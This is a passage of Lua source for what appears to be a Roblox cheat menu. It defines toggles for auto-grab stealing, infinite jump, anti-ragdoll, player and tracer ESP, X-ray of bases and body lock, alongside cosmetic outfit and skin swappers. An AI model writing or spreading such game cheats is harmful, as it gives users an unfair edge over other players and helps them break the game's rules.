do local row=mkRow(pageTOOLS,34); mkLabel(row,"Stop Time"); local pill, dot; do local __m = {mkPill(row,52)}; pill = __m[1]; dot = __m[2]; end; local function vis(on) TS:Create(pill,TweenInfo.new(0.15),{BackgroundColor3=on and COLORS.accent or COLORS.off}):Play(); TS:Create(dot,TweenInfo.new(0.15),{Position=on and UDim2.new(1,-22,0.5,-8) or UDim2.new(0,2,0.5,-8)}):Play() end; VS.setAutoGrabStopVisual=vis; pill.InputBegan:Connect(function(inp) if inp.UserInputType~=Enum.UserInputType.MouseButton1 and inp.UserInputType~=Enum.UserInputType.Touch then return end; autoGrabStopEnabled=not autoGrabStopEnabled; Steal.AutoGrabStopEnabled=autoGrabStopEnabled; vis(autoGrabStopEnabled); F.saveConfig() end) end
do local row=mkRow(pageTOOLS,34); mkLabel(row,"Stop Time (s)"); UI.stopTimeInput=mkBox(row,Steal.AutoGrabStopTime,54,62,function(v) v=tonumber(v); if v and v>0 then autoGrabStopTime=v; Steal.AutoGrabStopTime=v; F.saveConfig() end end) end
do local row=mkRow(pageTOOLS,34); mkLabel(row,"Delay Radius"); UI.delayRadInput=mkBox(row,Steal.AutoGrabDelayRadius,54,62,function(v) v=tonumber(v); if v and v>0 then autoGrabDelayRadius=v; Steal.AutoGrabDelayRadius=v; F.saveConfig() end end) end
VS.setWhiteBarVisual=mkToggle(pageTOOLS,"White Bar",function(on) S.whiteBarEnabled=on==true; pcall(function() if _G.__VersincApplyStealFillColor then _G.__VersincApplyStealFillColor(getFillColor()) end end); F.saveConfig() end)
section(pageTOOLS, "Combat") VS.setMedusaVisual = mkToggle(pageTOOLS, "Medusa Counter", function(on) S.medusaCounterEnabled = on F.refreshMedusaWatch(); F.saveConfig() end) do local row = mkRow(pageTOOLS, 34); mkLabel(row, "Instant Reset")
mkKB(row, KB.InstaReset, function(k, isGp) if isGp then KB.InstaReset.gp = k; KB.InstaReset.kb = nil else KB.InstaReset.kb = k; KB.InstaReset.gp = nil end; F.saveConfig() end) local clk = Instance.new("TextButton", row); clk.Size = UDim2.new(0.55, 0, 1, 0); clk.BackgroundTransparency = 1; clk.Text = ""; clk.ZIndex = 2 clk.Activated:Connect(function() if _G.ZombieFireInstaReset then _G.ZombieFireInstaReset() end end) end VS.setInfJumpVisual = mkToggle(pageTOOLS, "Infinite Jump", function(on) infJumpEnabled = on if on then F.startInfJump() else F.stopInfJump() end F.saveConfig() end) do
local row = mkRow(pageTOOLS, 34); mkLabel(row, "Jump Mode"); local btn = Instance.new("TextButton", row); btn.Size = UDim2.new(0, 72, 0, 24); btn.Position = UDim2.new(1, -80, 0.5, -12); btn.BackgroundColor3 = COLORS.row2; btn.BorderSizePixel = 0; btn.Text = ((S.infJumpMode or "hold") == "manual") and "Manual" or "Hold"; btn.TextColor3 = COLORS.white; btn.Font = Enum.Font.GothamBold; btn.TextSize = 11; btn.ZIndex = 5 corner(btn, 8); stroke(btn, COLORS.stroke, 1, 0.6); UI.infJumpModeBtn = btn btn.MouseButton1Click:Connect(function()
local nextMode = ((S.infJumpMode or "hold") == "manual") and "hold" or "manual" F.setInfJumpMode(nextMode); btn.Text = (nextMode == "manual") and "Manual" or "Hold" F.saveConfig() end) end VS.setAntiRagVisual = mkToggle(pageTOOLS, "Anti Ragdoll", function(on) S.antiRagdollEnabled = on if on then F.startAntiRagdoll() else F.stopAntiRagdoll() end F.saveConfig() end) do
local row = mkRow(pageTOOLS, 34); mkLabel(row, "Ragdoll Mode"); local btn = Instance.new("TextButton", row); btn.Size = UDim2.new(0, 72, 0, 24); btn.Position = UDim2.new(1, -80, 0.5, -12); btn.BackgroundColor3 = COLORS.row2; btn.BorderSizePixel = 0; btn.Text = (S.antiRagdollMode == 2) and "V2" or "V1"; btn.TextColor3 = COLORS.white; btn.Font = Enum.Font.GothamBold; btn.TextSize = 11; btn.ZIndex = 5; corner(btn, 8); stroke(btn, COLORS.stroke, 1, 0.6) btn.MouseButton1Click:Connect(function() S.antiRagdollMode = (S.antiRagdollMode == 2) and 1 or 2
btn.Text = (S.antiRagdollMode == 2) and "V2" or "V1" if S.antiRagdollEnabled then F.stopAntiRagdoll(); F.startAntiRagdoll() end F.saveConfig() end) end do
local expanded = false; local headerRow = mkRow(pageTOOLS, 34); mkLabel(headerRow, "Anti Die System"); local expandBtn = Instance.new("TextButton", headerRow); expandBtn.Size = UDim2.new(0, 72, 0, 24); expandBtn.Position = UDim2.new(1, -80, 0.5, -12); expandBtn.BackgroundColor3 = Color3.fromRGB(6,14,38); expandBtn.BorderSizePixel = 0; expandBtn.Text = "OPEN"; expandBtn.TextColor3 = COLORS.white; expandBtn.Font = Enum.Font.GothamBold; expandBtn.TextSize = 11; expandBtn.ZIndex = 5; corner(expandBtn, 8); stroke(expandBtn, COLORS.stroke, 1, 0.6)
VS.setAntiDieVisual = mkToggle(pageTOOLS, "Anti Die", function(on) if on then F.startAntiDie() else F.stopAntiDie() end end) VS.setAntiFlingVisual = mkToggle(pageTOOLS, "Fling Shield", function(on) if on then F.startAntiFlingShield() else F.stopAntiFlingShield() end end) local antiDieRow, flingRow = nil, nil local children = pageTOOLS:GetChildren() for i = #children, 1, -1 do local ch = children[i] if ch:IsA("Frame") then local lbl = ch:FindFirstChildWhichIsA("TextLabel") if lbl and lbl.Text == "Fling Shield" and not flingRow then flingRow = ch
elseif lbl and lbl.Text == "Anti Die" and not antiDieRow then antiDieRow = ch end end if antiDieRow and flingRow then break end end if antiDieRow then antiDieRow.Visible = false end if flingRow then flingRow.Visible = false end expandBtn.MouseButton1Click:Connect(function() expanded = not expanded expandBtn.Text = expanded and "CLOSE" or "OPEN" if antiDieRow then antiDieRow.Visible = expanded end if flingRow then flingRow.Visible = expanded end end) end VS.setNoPlayerCollisionVisual = mkToggle(pageTOOLS, "No Player Collision", function(on)
if on then F.enableNoPlayerCollision() else F.disableNoPlayerCollision() end F.saveConfig() end) VS.setSafeModeVisual = mkToggle(pageTOOLS, "Safe Mode", function(on) S.safeModeEnabled = on F.saveConfig() end) VS.setInformationE01Visual = mkToggle(pageTOOLS, "Information E01", function(on) S.informationE01Enabled = on if not on then local pg = LP and LP:FindFirstChildOfClass("PlayerGui"); local active = pg and pg:FindFirstChild("BrainrotEnterIntro"); if active then active:Destroy() end end F.saveConfig() end) VS.setMedusaResetVisual = mkToggle(pageTOOLS, "Medusa Reset", function(on) S.medusaResetEnabled = on F.refreshMedusaWatch(); F.saveConfig() end) VS.setAutoResetOnMedVisual = mkToggle(pageTOOLS, "Auto Reset On Med Fling", function(on) F.setAutoResetOnMed(on) F.saveConfig() end) VS.setBodyLockVisual = mkToggle(pageTOOLS, "Body Lock", function(on) if on then
if K7 and K7.startBodyLock then K7.startBodyLock() elseif startBodyLock then startBodyLock() end else if K7 and K7.stopBodyLock then K7.stopBodyLock(true) elseif stopBodyLock then stopBodyLock(true) end end F.saveConfig() end) do local row = mkRow(pageTOOLS, 34); mkLabel(row, "Lock Radius"); local rad = (K7 and K7.bodyLockRadius) or bodyLockRadius or 60 mkBox(row, rad, 54, 62, function(v) if v >= 5 and v <= 300 then if K7 then K7.bodyLockRadius = v end bodyLockRadius = v end F.saveConfig() end) end
lo = 0; section(pageVIEW, "Visual")
VS.setAntiLagVisual = mkToggle(pageVIEW, "FPS Boost (Anti Lag)", function(on) if on then F.enableAntiLag() else F.disableAntiLag() end F.saveConfig() end) VS.setStretchRezVisual = mkToggle(pageVIEW, "Stretch Rez", function(on) if on then enableStretchRez() else disableStretchRez() end F.saveConfig() end) VS.setUnwalkVisual = mkToggle(pageVIEW, "Unwalk", function(on) S.unwalkEnabled = on if on then F.startUnwalk() else F.stopUnwalk() end end) VS.setRemoveAccVisual = mkToggle(pageVIEW, "Remove Accessories", function(on) if on then F.startRemoveAccessories() else F.stopRemoveAccessories() end
F.saveConfig() end)
VS.setMotionBlurVisual = mkToggle(pageVIEW, "Motion Blur", function(on) F.setMotionBlur(on); F.saveConfig() end)
VS.setXRayBasesVisual = mkToggle(pageVIEW, "X-Ray Bases", function(on) F.setXRayBases(on); F.saveConfig() end)
VS.setXRayBrainrotsVisual = mkToggle(pageVIEW, "X-Ray Brainrots", function(on) F.setXRayBrainrots(on); F.saveConfig() end)
VS.setKeyboardOverlayVisual = mkToggle(pageVIEW, "Keyboard Overlay", function(on) if on then F.startKeyboardOverlay() else F.stopKeyboardOverlay() end F.saveConfig() end) section(pageVIEW, "Sword Editor")
VS.setCustomToolsVisual = mkToggle(pageVIEW, "Enable Sword Editor", function(on) ToolEditor.setEnabled(on); F.saveConfig() end)
local function closeSkinCatalog() local old=gui:FindFirstChild("ZombieVSSkinCatalog") if old then old:Destroy() end end
local function openSkinCatalog(cat,label,onPick)
closeSkinCatalog()
local modal=Instance.new("Frame",gui);modal.Name="ZombieVSSkinCatalog";modal.Size=UDim2.new(1,0,1,0);modal.BackgroundColor3=Color3.fromRGB(0,0,0);modal.BackgroundTransparency=0.32;modal.ZIndex=50
local close=Instance.new("TextButton",modal);close.Size=UDim2.new(1,0,1,0);close.BackgroundTransparency=1;close.Text="";close.ZIndex=50;close.Activated:Connect(closeSkinCatalog)
local panel=Instance.new("Frame",modal);panel.AnchorPoint=Vector2.new(0.5,0.5);panel.Position=UDim2.new(0.5,0,0.5,0);panel.Size=UDim2.new(0,360,0,420);panel.BackgroundColor3=COLORS.bg;panel.BorderSizePixel=0;panel.ZIndex=51;corner(panel,14);stroke(panel,COLORS.stroke,1,0.25)
local caption=Instance.new("TextLabel",panel);caption.Position=UDim2.new(0,14,0,8);caption.Size=UDim2.new(1,-58,0,32);caption.BackgroundTransparency=1;caption.Text=label;caption.TextColor3=COLORS.white;caption.Font=Enum.Font.GothamBlack;caption.TextSize=14;caption.TextXAlignment=Enum.TextXAlignment.Left;caption.ZIndex=52
local x=Instance.new("TextButton",panel);x.Position=UDim2.new(1,-42,0,8);x.Size=UDim2.new(0,32,0,32);x.BackgroundColor3=COLORS.row2;x.BorderSizePixel=0;x.Text="\u{00D7}";x.TextColor3=COLORS.white;x.Font=Enum.Font.GothamBlack;x.TextSize=18;x.ZIndex=53;corner(x,8);x.Activated:Connect(closeSkinCatalog)
local scroll=Instance.new("ScrollingFrame",panel);scroll.Position=UDim2.new(0,8,0,48);scroll.Size=UDim2.new(1,-16,1,-58);scroll.BackgroundTransparency=1;scroll.BorderSizePixel=0;scroll.ScrollBarThickness=3;scroll.ScrollBarImageColor3=COLORS.accent;scroll.AutomaticCanvasSize=Enum.AutomaticSize.Y;scroll.CanvasSize=UDim2.new();scroll.ZIndex=52
local grid=Instance.new("UIGridLayout",scroll);grid.CellSize=UDim2.new(0,158,0,182);grid.CellPadding=UDim2.new(0,8,0,8);grid.HorizontalAlignment=Enum.HorizontalAlignment.Center;grid.SortOrder=Enum.SortOrder.LayoutOrder
local cards={}
local function currentKey() return cat=="Bat" and S.customToolSkinBat or S.customToolSkinMedusa end
local function refreshAll() for _,e in ipairs(cards) do local sel=(currentKey()==e.key);e.stroke.Color=sel and COLORS.white or COLORS.strokeSoft;e.stroke.Transparency=sel and 0 or 0.55;e.stroke.Thickness=sel and 2.2 or 1.2;e.card.BackgroundTransparency=sel and 0 or 0.18;e.tag.Visible=sel end end
local order=TOOL_ORDER[cat] or {}
for i,key in ipairs(order) do
local def=TOOL_ASSETS[key]
if def then
local card=Instance.new("Frame",scroll);card.Name="Skin_"..key;card.BackgroundColor3=COLORS.row;card.BorderSizePixel=0;card.LayoutOrder=i;card.ZIndex=53;corner(card,12)
local st=stroke(card,COLORS.strokeSoft,1.2,0.55)
local vp=Instance.new("ViewportFrame",card);vp.Position=UDim2.new(0,8,0,8);vp.Size=UDim2.new(1,-16,0,124);vp.BackgroundColor3=Color3.fromRGB(10,10,13);vp.BackgroundTransparency=0.2;vp.BorderSizePixel=0;vp.ZIndex=54;vp.Ambient=Color3.fromRGB(190,190,200);vp.LightColor=Color3.fromRGB(255,255,255);vp.LightDirection=Vector3.new(-0.4,-1,-0.6);corner(vp,10)
local part=Instance.new("Part");part.Anchored=true;part.CanCollide=false;part.Size=Vector3.new(1,1,1);part.CFrame=CFrame.new(0,0,0);part.Parent=vp
local mesh=Instance.new("SpecialMesh",part);mesh.MeshType=Enum.MeshType.FileMesh;mesh.MeshId=def.mesh;mesh.TextureId=def.tex;mesh.Scale=def.scale
local camv=Instance.new("Camera",vp);camv.FieldOfView=45;vp.CurrentCamera=camv
local dist=def.view or 4.5;camv.CFrame=CFrame.new(Vector3.new(0,dist*0.35,dist),Vector3.new(0,0,0))
local nameLbl=Instance.new("TextLabel",card);nameLbl.Position=UDim2.new(0,6,0,136);nameLbl.Size=UDim2.new(1,-12,0,26);nameLbl.BackgroundTransparency=1;nameLbl.Text=def.label or key;nameLbl.TextColor3=COLORS.white;nameLbl.Font=Enum.Font.GothamBold;nameLbl.TextSize=11;nameLbl.TextWrapped=true;nameLbl.ZIndex=55
local tag=Instance.new("TextLabel",card);tag.Position=UDim2.new(0,6,0,160);tag.Size=UDim2.new(1,-12,0,16);tag.BackgroundTransparency=1;tag.Text="SELECTED";tag.TextColor3=COLORS.accentStrong;tag.Font=Enum.Font.GothamBlack;tag.TextSize=9;tag.ZIndex=55;tag.Visible=false
local clk=Instance.new("TextButton",card);clk.Size=UDim2.new(1,0,1,0);clk.BackgroundTransparency=1;clk.Text="";clk.ZIndex=56
clk.Activated:Connect(function() ToolEditor.setSkin(cat,key);if onPick then pcall(onPick) end;refreshAll();pcall(F.saveConfig) end)
cards[#cards+1]={card=card,key=key,stroke=st,part=part,tag=tag}
end
end
refreshAll()
local spin=RunService.RenderStepped:Connect(function(dt) for _,e in ipairs(cards) do if e.part and e.part.Parent then e.part.CFrame=e.part.CFrame*CFrame.Angles(0,dt*1.2,0) end end end)
modal.AncestryChanged:Connect(function(_,parent) if not parent then pcall(function() spin:Disconnect() end) end end)
end
local function makeSkinPicker(cat,label)
local row=mkRow(pageVIEW,34);mkLabel(row,label);local btn=Instance.new("TextButton",row);btn.Size=UDim2.new(0,132,0,24);btn.Position=UDim2.new(1,-140,0.5,-12);btn.BackgroundColor3=Color3.fromRGB(18,18,20);btn.BorderSizePixel=0;btn.TextColor3=COLORS.white;btn.Font=Enum.Font.GothamBold;btn.TextSize=10;btn.ZIndex=6;corner(btn,8);stroke(btn,COLORS.stroke,1,0.55)
local function current() return cat=="Bat" and S.customToolSkinBat or S.customToolSkinMedusa end
local function refresh() local d=TOOL_ASSETS[current()];btn.Text=(d and d.label or current()).."  \u{25BC}" end refresh()
btn.Activated:Connect(function() openSkinCatalog(cat,label,refresh) end)
return refresh end
UI.refreshSwordSkin=makeSkinPicker("Bat","Sword Skin")
UI.refreshMedusaSkin=makeSkinPicker("Medusa","Medusa Skin")
VS.setRainbowToolsVisual=mkToggle(pageVIEW,"Rainbow Tools",function(on) ToolEditor.setRainbow(on);F.saveConfig() end)
VS.setRainbowJoystickVisual=mkToggle(pageVIEW,"Rainbow Joystick",function(on) if F.setRainbowJoystick then F.setRainbowJoystick(on) end;F.saveConfig() end)
VS.setTransparentToolsVisual=mkToggle(pageVIEW,"Transparent Tools",function(on) ToolEditor.setTransparency(on);F.saveConfig() end)
VS.setCustomSoundsVisual=mkToggle(pageVIEW,"Sword + Medusa Sounds",function(on) ToolEditor.setSounds(on);F.saveConfig() end) section(pageVIEW, "ESP") VS.setLineESPVisual = mkToggle(pageVIEW, "Player ESP", function(on) K7.lineESPEnabled = on K7.speedESPEnabled = on; K7.refreshESP(); F.saveConfig() end) VS.setShowTrackerVisual = mkToggle(pageVIEW, "Tracer ESP", function(on) S.showTracerEnabled = on if on then startTracerESP() else stopTracerESP() end pcall(function() if F.setShowTracer then F.setShowTracer(false) end end)
pcall(function() if F.clearTracers then F.clearTracers() end end) S.showTracerEnabled = on; F.saveConfig() end) VS.setShowTracerVisual = VS.setShowTrackerVisual VS.setSpeedESPVisual = function(on) if VS.setLineESPVisual then VS.setLineESPVisual(on) end end VS.setRagdollCdVisual = mkToggle(pageVIEW, "Ragdoll Countdown", function(on) F.setRagdollCountdown(on) F.saveConfig() end) section(pageVIEW, "Sky & Vision") do
local row = mkRow(pageVIEW, 34); mkLabel(row, "Sky Theme"); local skyLbl = Instance.new("TextLabel", row); skyLbl.Size = UDim2.new(0, 90, 0, 24); skyLbl.Position = UDim2.new(1, -100, 0.5, -12); skyLbl.BackgroundColor3 = Color3.fromRGB(6,14,38); skyLbl.Text = K7.currentSkyTheme; skyLbl.TextColor3 = COLORS.white; skyLbl.Font = Enum.Font.GothamBold; skyLbl.TextSize = 11; Instance.new("UICorner", skyLbl).CornerRadius = UDim.new(0, 6); local clk = Instance.new("TextButton", row); clk.Size = UDim2.new(1, 0, 1, 0); clk.BackgroundTransparency = 1; clk.Text = ""; clk.ZIndex = 3
clk.Activated:Connect(function() local name = K7.cycleSkyTheme(1) skyLbl.Text = name; F.saveConfig() end) end do local row = mkRow(pageVIEW, 34); mkLabel(row, "FOV") local fovBox = mkBox(row, K7.fovValue or _G._VezyFOV or 70, 54, 62, function(v) if v >= 30 and v <= 180 then K7.fovValue = v; _G._VezyFOV = v if K7.fovEnabled then K7.applyFOV() end local cam = workspace.CurrentCamera if cam and not (State and State.stretchedResEnabled) then pcall(function() cam.FieldOfView = v end) end end F.saveConfig() end) end VS.setFOVVisual = mkToggle(pageVIEW, "Custom FOV", function(on) K7.fovEnabled = on
K7.applyFOV(); F.saveConfig() end) lo = 0 section(pageSYS, "Charter") VS.setHeadlessVisual = mkToggle(pageSYS, "Headless", function(on) K7.headlessEnabled = on K7.applyHeadless(LP.Character, on); F.saveConfig() end) VS.setKorbloxVisual = mkToggle(pageSYS, "Korblox", function(on) K7.korbloxEnabled = on K7.applyKorblox(LP.Character, on); F.saveConfig() end) do
local sideNames = {[1] = "Right", [2] = "Left", [3] = "Both"}; local row = mkRow(pageSYS, 34); mkLabel(row, "Korblox Side"); local btn = Instance.new("TextButton", row); btn.Size = UDim2.new(0, 72, 0, 24); btn.Position = UDim2.new(1, -80, 0.5, -12); btn.BackgroundColor3 = COLORS.row2; btn.BorderSizePixel = 0; btn.Text = sideNames[korbloxSide] or "Right"; btn.TextColor3 = COLORS.white; btn.Font = Enum.Font.GothamBold; btn.TextSize = 11; btn.ZIndex = 5; corner(btn, 8); stroke(btn, COLORS.stroke, 1, 0.6) btn.MouseButton1Click:Connect(function() korbloxSide = (korbloxSide % 3) + 1
K7.korbloxSide = korbloxSide; btn.Text = sideNames[korbloxSide] or "Right" if K7.korbloxEnabled then K7.applyKorblox(LP.Character, true) end F.saveConfig() end) end section(pageSYS, "Animation Pack") VS.setAnimPackVisual = mkToggle(pageSYS, "Animation Pack Enabled", function(on) K7.animPackEnabled = on if on then K7.applyAnimPack(K7.animPackName) else K7.resetAnimPack() end F.saveConfig() end) do
local row = mkRow(pageSYS, 34); mkLabel(row, "Select Pack"); local packLbl = Instance.new("TextLabel", row); packLbl.Size = UDim2.new(0, 100, 0, 24); packLbl.Position = UDim2.new(1, -110, 0.5, -12); packLbl.BackgroundColor3 = Color3.fromRGB(6,14,38); packLbl.Text = K7.animPackName; UI.animPackLbl = packLbl; packLbl.TextColor3 = COLORS.white; packLbl.Font = Enum.Font.GothamBold; packLbl.TextSize = 10; Instance.new("UICorner", packLbl).CornerRadius = UDim.new(0, 6); local clk = Instance.new("TextButton", row); clk.Size = UDim2.new(1, 0, 1, 0); clk.BackgroundTransparency = 1; clk.Text = ""; clk.ZIndex = 3
clk.Activated:Connect(function() K7.animPackIndex = K7.animPackIndex % #K7.ANIM_PACK_LIST + 1 K7.animPackName = K7.ANIM_PACK_LIST[K7.animPackIndex]; packLbl.Text = K7.animPackName if K7.animPackEnabled then K7.applyAnimPack(K7.animPackName) end F.saveConfig() end) end do
local row = mkRow(pageSYS, 34); mkLabel(row, "Current Pack"); local applyBtn = Instance.new("TextButton", row); applyBtn.Size = UDim2.new(0, 60, 0, 24); applyBtn.Position = UDim2.new(1, -70, 0.5, -12); applyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 44); applyBtn.Text = "APPLY"; applyBtn.TextColor3 = COLORS.white; applyBtn.Font = Enum.Font.GothamBold; applyBtn.TextSize = 11; applyBtn.BorderSizePixel = 0; Instance.new("UICorner", applyBtn).CornerRadius = UDim.new(0, 6) applyBtn.Activated:Connect(function() if K7.animPackEnabled then K7.applyAnimPack(K7.animPackName) end F.saveConfig() end)
-- OUTFIT SELECTOR (portado do Vx7 - Skin Collection)
section(pageSYS, "Outfit")
do
local OUTFIT_LIST = {
    { name = "OUTFIT 1", sub = "Outfit 1", asset = 10997283529 },
    { name = "OUTFIT 2", sub = "Outfit 2", asset = 125157548394108 },
    { name = "OUTFIT 3", sub = "Outfit 3", asset = 136644276218918 },
    { name = "OUTFIT 4", sub = "Outfit 4", asset = 119331031817124 },
    { name = "OUTFIT 5", sub = "Outfit 5", asset = 18902416696 },
    { name = "OUTFIT 6", sub = "Outfit 6", asset = 13935333090 },
    { name = "OUTFIT 7", sub = "Outfit 7", asset = 91274263831244 },
    { name = "OUTFIT 8", sub = "Outfit 8", asset = 76479271580913 },
    { name = "OUTFIT 9", sub = "Outfit 9", asset = 82277826177074 },
    { name = "OUTFIT 10", sub = "Outfit 10", asset = 10928435480, previewItems = {10928435480, 6913613757, 9683332649} },
    { name = "OUTFIT 11", sub = "Outfit 11", asset = 306969564, pack = "Skin 1" },
    { name = "OUTFIT 12", sub = "Outfit 12", asset = 1744060292, pack = "Skin 2" },
    { name = "OUTFIT 13", sub = "Outfit 13", asset = 112564966849233, pack = "Skin 3" },
    { name = "OUTFIT 14", sub = "Outfit 14", asset = 10159600649, pack = "Skin 4" },
    { name = "OUTFIT 15", sub = "Outfit 15", asset = 8349240186, pack = "Skin 5" },
    { name = "OUTFIT 16", sub = "Outfit 16", asset = 121097973925756, pack = "Skin 6" },
    { name = "OUTFIT 17", sub = "Outfit 17", pack = "Skin 7" },
}
local OUTFIT_SRC = 'local Players = game:GetService("Players")\nlocal UIS = game:GetService("UserInputService")\nlocal TweenService = game:GetService("TweenService")\nlocal InsertService = game:GetService("InsertService")\nlocal MarketplaceService = game:GetService("MarketplaceService")\nlocal HttpService = game:GetService("HttpService")\ndo local __m = {pcall(function() return gethui and gethui() end)}; huiOk = __m[1]; huiResult = __m[2]; end\nlocal CoreGui = huiOk and huiResult or game:GetService("CoreGui")\nlocal LP = Players.LocalPlayer\nlocal OUTFITS = {\n{\nid = 10997283529,\nlabel = "OUTFIT 1",\nhideOriginal = false,\nhideOriginalHead = true,\nclearOriginalWearables = true,\nbodyItems = {115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322},\nitems = {10997283529, 125085889448130},\n},\n{\nlabel = "OUTFIT 2",\nhideOriginal = false,\nclearOriginalWearables = true,\nbodyItems = {115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322},\nitems = {125157548394108, 123231522991173, 74827642361405},\n},\n{\nlabel = "OUTFIT 3",\nhideOriginal = false,\nclearOriginalWearables = true,\nbodyItems = {115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322},\nscales = {HeightScale = 1, WidthScale = 0.85, DepthScale = 0.88, HeadScale = 0.95, BodyTypeScale = 1, ProportionScale = 0.85},\nface = 86109936998865,\nfaceMode = "decal",\nitems = {136644276218918, 132022106987543, 131740907052260},\n},\n{\nlabel = "OUTFIT 4",\nhideOriginal = false,\nheadless = true,\nclearOriginalWearables = true,\nbodyItems = {115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322},\nscales = {HeightScale = 1, WidthScale = 0.82, DepthScale = 0.85, HeadScale = 0.95, BodyTypeScale = 1, ProportionScale = 0.9},\nlayeredPuffiness = 0,\nitems = {119331031817124, 84952305140948},\n},\n{\nlabel = "OUTFIT 5",\nhideOriginal = false,\nheadless = true,\nclearOriginalWearables = true,\nbodyItems = {115566893133129, 103980259507115, 109790632200416, 112532740065682, 120301257476322},\nscales = {HeightScale = 1, WidthScale = 0.82, DepthScale = 0.85, HeadScale = 0.95, BodyTypeScale = 1, ProportionScale = 0.9},\nlayeredPuffiness = 0,\nitems = {18902416696, 17739456422, 116750288839357, 12842417046, 122223069519702},\n},\n{\nlabel = "OUTFIT 6",\nhideOriginal = false,\nclearOriginalWearables = true,\nitems = {13935333090, 16110951997, 10632503818},\n},\n{\nlabel = "OUTFIT 7",\nhideOriginal = false,\nheadless = true,\nclearOriginalWearables = true,\nitems = {74891470, 4390891467, 91274263831244, 128424248603010, 91151766440767, 17044638424},\n},\n{\nlabel = "OUTFIT 8",\nhideOriginal = false,\nheadless = true,\nhideRightLeg = true,\nlocalOnly = true,\nclearOriginalWearables = true,\nitems = {76479271580913, 1402432199, 140627490971265, 128912609563885, 17449551560, 5796531729, 139607718},\n},\n{\nlabel = "OUTFIT 9",\nlocalOnly = true,\npreserveRig = true,\nhideOriginal = false,\nhideLeftLeg = true,\nhideRightLeg = true,\nclearOriginalWearables = true,\nitems = {70414871864071,14863917259,133498027006138,82277826177074},\naccessorySlots = {[70414871864071]=Enum.AccessoryType.Waist,[14863917259]=Enum.AccessoryType.Neck,\n[133498027006138]=Enum.AccessoryType.Shoulder,[82277826177074]=Enum.AccessoryType.Sweater},\n},\n{\nlabel = "OUTFIT 10",\nlocalOnly = true,\npreserveRig = true,\nhideOriginal = true,\nclearOriginalWearables = true,\nitems = {10928435480, 6913613757, 9683332649},\n},\n}\nlocal BODY_PART_NAMES = {\nHead = true, UpperTorso = true, LowerTorso = true, Torso = true,\nLeftUpperArm = true, LeftLowerArm = true, LeftHand = true,\nRightUpperArm = true, RightLowerArm = true, RightHand = true,\nLeftUpperLeg = true, LeftLowerLeg = true, LeftFoot = true,\nRightUpperLeg = true, RightLowerLeg = true, RightFoot = true,\n["Left Arm"] = true, ["Right Arm"] = true,\n["Left Leg"] = true, ["Right Leg"] = true,\n}\nlocal PART_NAME_ALIASES = {\n["Korblox-Deathspeaker-Right-Leg"] = "RightUpperLeg",\n}\nlocal state = {\nenabled = false,\nselected = 1,\nvisuals = {},\nhidden = {},\nwearableConn = nil,\nheadlessConn = nil,\nheadlessLoop = nil,\nstatsLoop = nil,\nsavedWalkSpeed = nil,\nsavedJumpPower = nil,\noriginalDescription = nil,\ndescriptionCharacter = nil,\nconnections = {},\n}\nlocal function currentCharacter()\nlocal character = LP.Character or LP.CharacterAdded:Wait()\nlocal humanoid = character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 8)\nlocal root = character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart", 8)\nreturn character, humanoid, root\nend\nlocal function restoreOriginalBody()\nfor object, saved in pairs(state.hidden) do\nif object and object.Parent then\npcall(function()\nif type(saved) == "table" and saved.basePart then\nobject.LocalTransparencyModifier = saved.localTransparency\nobject.Transparency = saved.transparency\nelseif type(saved) == "table" and saved.properties then\nfor property, value in pairs(saved.properties) do object[property] = value end\nelseif type(saved) == "table" and saved.property then\nobject[saved.property] = saved.value\nelseif object:IsA("BasePart") then\nobject.LocalTransparencyModifier = saved\nelseif object:IsA("Decal") or object:IsA("Texture") then\nobject.Transparency = saved\nend\nend)\nend\nend\nstate.hidden = {}\nend\nlocal stopHeadless\nlocal enforceHeadless\nlocal function clearVisuals()\nstopHeadless()\nif state.wearableConn then\nstate.wearableConn:Disconnect()\nstate.wearableConn = nil\nend\nfor _, object in ipairs(state.visuals) do\nif object and object.Parent then pcall(function() object:Destroy() end) end\nend\nstate.visuals = {}\nrestoreOriginalBody()\nend\nlocal function belongsToLocalVisual(object)\nfor _, visual in ipairs(state.visuals) do\nif object == visual or object:IsDescendantOf(visual) then return true end\nend\nreturn false\nend\nlocal function hideOriginalBody(character)\nrestoreOriginalBody()\nfor _, object in ipairs(character:GetDescendants()) do\nif not belongsToLocalVisual(object) then\nif object:IsA("BasePart") then\nstate.hidden[object] = object.LocalTransparencyModifier\nobject.LocalTransparencyModifier = 1\nelseif object:IsA("Decal") or object:IsA("Texture") then\nstate.hidden[object] = object.Transparency\nobject.Transparency = 1\nend\nend\nend\nend\nlocal function hideOriginalHead(character)\nlocal head = character:FindFirstChild("Head")\nif not head or not head:IsA("BasePart") then return end\nif state.hidden[head] == nil then\nstate.hidden[head] = {\nbasePart = true,\nlocalTransparency = head.LocalTransparencyModifier,\ntransparency = head.Transparency,\n}\nelseif type(state.hidden[head]) ~= "table" then\nstate.hidden[head] = {\nbasePart = true,\nlocalTransparency = state.hidden[head],\ntransparency = head.Transparency,\n}\nend\nhead.LocalTransparencyModifier = 1\nhead.Transparency = 1\nfor _, object in ipairs(head:GetDescendants()) do\nif (object:IsA("Decal") or object:IsA("Texture")) and state.hidden[object] == nil then\nstate.hidden[object] = object.Transparency\nobject.Transparency = 1\nend\nend\nend\nlocal function hideLegSide(character, side)\nlocal names = {side .. "UpperLeg", side .. "LowerLeg", side .. "Foot", side .. " Leg", side .. "Toe"}\nfor _, name in ipairs(names) do\nlocal part = character:FindFirstChild(name)\nif part and part:IsA("BasePart") then\nif state.hidden[part] == nil then\nstate.hidden[part] = {\nbasePart = true,\nlocalTransparency = part.LocalTransparencyModifier,\ntransparency = part.Transparency,\n}\nelseif type(state.hidden[part]) ~= "table" then\nstate.hidden[part] = {\nbasePart = true,\nlocalTransparency = state.hidden[part],\ntransparency = part.Transparency,\n}\nend\npart.LocalTransparencyModifier = 1\npart.Transparency = 1\nend\nend\nend\nlocal function hideLeftLeg(character)\nhideLegSide(character, "Left")\nend\nlocal function hideRightLeg(character)\nhideLegSide(character, "Right")\nend\nstopHeadless = function()\nif state.headlessConn then\npcall(state.headlessConn.Disconnect, state.headlessConn)\nstate.headlessConn = nil\nend\nif state.headlessLoop then\npcall(task.cancel, 